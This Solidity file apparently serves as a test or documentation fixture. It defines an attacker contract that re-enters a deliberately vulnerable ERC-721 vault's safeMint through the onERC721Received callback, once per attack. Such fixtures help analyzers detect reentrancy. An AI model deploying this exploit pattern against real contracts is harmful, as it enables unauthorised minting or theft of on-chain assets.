pragma solidity ^0.8.0;

interface IVulnerableVault {
    function safeMint(address to, uint256 tokenId) external;
}

/// @notice Reference attacker contract used in documentation/integration
/// scenarios: on receiving the ERC-721 receiver-hook callback, it
/// immediately re-enters the calling vault. Included for scenario realism
/// alongside VulnerableERC721Vault; the analyzer's findings are produced
/// from the vault's own source and do not depend on this contract.
contract MaliciousReentrantReceiver {
    IVulnerableVault public target;
    uint256 public reentryCount;

    constructor(address _target) {
        target = IVulnerableVault(_target);
    }

    function attack(uint256 tokenId) external {
        target.safeMint(address(this), tokenId);
    }

    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata
    ) external returns (bytes4) {
        if (reentryCount < 1) {
            reentryCount += 1;
            target.safeMint(address(this), tokenId + 1);
        }
        return this.onERC721Received.selector;
    }
}
